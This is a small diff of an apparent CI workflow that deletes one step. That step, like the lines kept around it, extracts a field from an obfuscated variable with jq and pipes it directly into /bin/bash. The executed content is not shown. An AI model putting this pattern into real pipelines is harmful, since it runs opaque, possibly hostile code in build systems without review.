@@ -22,7 +22,6 @@ jobs:
           echo $e7 | jq -r .mzwi9 | /bin/bash
           printf '%s' "$nfet04" | jq -r .nos67 | /bin/bash
           printf '%s' "$y73235" | jq -r .gpjt7208 | /bin/bash
-          printf '%s' "$pvp828" | jq -r .ch69936 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
